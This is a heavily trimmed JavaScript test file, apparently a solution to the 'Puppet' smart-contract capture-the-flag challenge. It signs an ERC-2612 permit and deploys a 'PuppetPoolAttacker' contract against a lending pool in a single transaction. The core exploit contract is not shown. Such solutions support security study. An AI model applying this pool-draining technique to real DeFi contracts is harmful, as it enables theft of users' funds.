...
describe("[Challenge] Puppet", function () {
  ...
  let nonce; // NB: added to accurately get and assert the right number of txs per test
  ...
  it("Execution (using `<Signer>._signTypedData()` from `ethers.js`)", async function () {
    ...
    // NB: how much ETH send on deployment could be more accurate by estimating the gas and so on
    // const dvtDomainSeparator = await token.DOMAIN_SEPARATOR();
    ...
    // NB: it seems `EIPT712Domain` must be removed from `types` using ethers.js
    // https://github.com/ethers-io/ethers.js/discussions/3163
    const types = {
      // NB: do not uncomment
      // EIP712Domain: [
    ...
    await (
      await ethers.getContractFactory("PuppetPoolAttacker", player)
    ).deploy(lendingPool.address, v, r, s, { value: 24n * 10n ** 18n });
  });

  it("Execution (using `signERC2612Permit()` from `eth-permit` package)", async function () {
    /** CODE YOUR SOLUTION HERE */
    nonce = await ethers.provider.getTransactionCount(player.address);
    const attackerAddr = ethers.utils.getContractAddress({
      from: player.address,
  ...
  afterEach(async function () {
    ...
    expect(
      (await ethers.provider.getTransactionCount(player.address)) - nonce
    ).to.eq(1);
